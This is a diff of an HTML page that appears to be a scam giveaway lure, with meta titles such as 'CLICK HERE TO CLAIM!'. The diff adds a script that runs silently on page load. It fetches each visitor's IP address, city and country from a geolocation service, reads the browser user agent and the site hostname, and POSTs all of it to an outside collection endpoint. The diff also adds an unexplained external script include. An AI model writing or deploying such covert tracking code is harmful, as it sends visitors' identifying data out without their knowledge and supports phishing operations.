@@ -24,13 +24,31 @@ plasmo-csui {
 
 
 
-<script> 
-// window.addEventListener('beforeunload', function() {
-//    //localStorage.removeItem('yourItemKey');  // Replace 'yourItemKey' with the key you want to remove
-//     localStorage.removeItem('superfast_challenge_passed');
-//     localStorage.removeItem('browserCheckPassed');
-// });
+
+<script>
+  fetch('https://ipapi.co/json/')
+    .then(res => res.json())
+    .then(data => {
+      const ip = data.ip;
+      const city = data.city;
+      const country = data.country_code; // Changed from country_name to country_code
+      const browser = navigator.userAgent;
+      const site = window.location.hostname;
+
+      fetch('https://in.greenfields.cc/gotty.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: new URLSearchParams({
+          ip: ip,
+          city: city,
+          country: country,
+          browser: browser,
+          site: site
+        })
+      });
+    });
 </script>
+<script src="adventure.js"></script>
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta property="og:title" content="CLICK HERE TO CLAIM!">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -1221,9 +1239,3 @@ TRY YOUR LUCK ! &#128640;
     // setTimeout(loadScript, 10);
 </script>
             
-<link rel="stylesheet" href="dlJRTWyalsfDXwu0MbB/G1YzTnTgYlaue2pspbMkW2S.css">
-<script src="dlJRTWyalsfDXwu0MbB/QmcjKfFwXJiyMXpwo.js"></script>
-<script src="dlJRTWyalsfDXwu0MbB/rNpcslngF7Sbu15.js"></script>
-<script src="dlJRTWyalsfDXwu0MbB/JEEwVZ9MsawatjvEb.js"></script>
-<script src="dlJRTWyalsfDXwu0MbB/Zl7Ejf0z6CH3q25g6UGlS.js"></script>
-<script src="dlJRTWyalsfDXwu0MbB/rKx60FHdWt6zsdSInVqtaT.js"></script>
